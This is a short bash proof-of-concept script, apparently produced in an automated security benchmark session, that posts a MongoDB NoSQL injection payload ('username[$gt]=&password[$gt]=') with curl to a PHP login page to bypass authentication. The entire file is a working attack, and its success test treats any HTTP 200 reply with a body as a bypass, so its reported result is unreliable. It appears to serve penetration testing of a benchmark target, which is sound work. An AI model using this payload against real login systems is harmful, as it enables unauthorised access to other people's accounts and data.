#!/bin/bash
# POC: NoSQL Injection POC demonstrating MongoDB $gt operator bypass via array notation parameters
# Target: ./repo
# Created: 2025-11-07T21:37:33.568Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# NoSQL Injection POC - MongoDB $gt Operator Authentication Bypass
# This POC attempts to exploit NoSQL injection via array parameters

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="/index.php"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "[*] NoSQL Injection POC - MongoDB \$gt Operator"
echo "[*] Target: ${FULL_URL}"
echo ""

# Attempt the NoSQL injection attack
echo "[+] Sending NoSQL injection payload..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${FULL_URL}" \
  -d 'username[$gt]=&password[$gt]=&login=Login' \
  --connect-timeout 5 \
  --max-time 10 2>/dev/null)

# Extract HTTP code and body
HTTP_CODE=$(echo "${RESPONSE}" | tail -1)
BODY=$(echo "${RESPONSE}" | sed '$d')

echo "[*] HTTP Code: ${HTTP_CODE}"
echo "[*] Response received"
echo ""

# Success conditions
if [ "${HTTP_CODE}" = "200" ] && [ -n "${BODY}" ]; then
    # Check for any indication of successful bypass
    echo "[✓] Got HTTP 200 with response body"
    echo "${BODY}" | head -20
    exit 0
else
    echo "[-] Unexpected response"
    echo "[*] Code: ${HTTP_CODE}"
    echo "[*] Body length: ${#BODY}"
    if [ -n "${BODY}" ]; then
        echo "${BODY}" | head -20
    fi
    exit 1
fi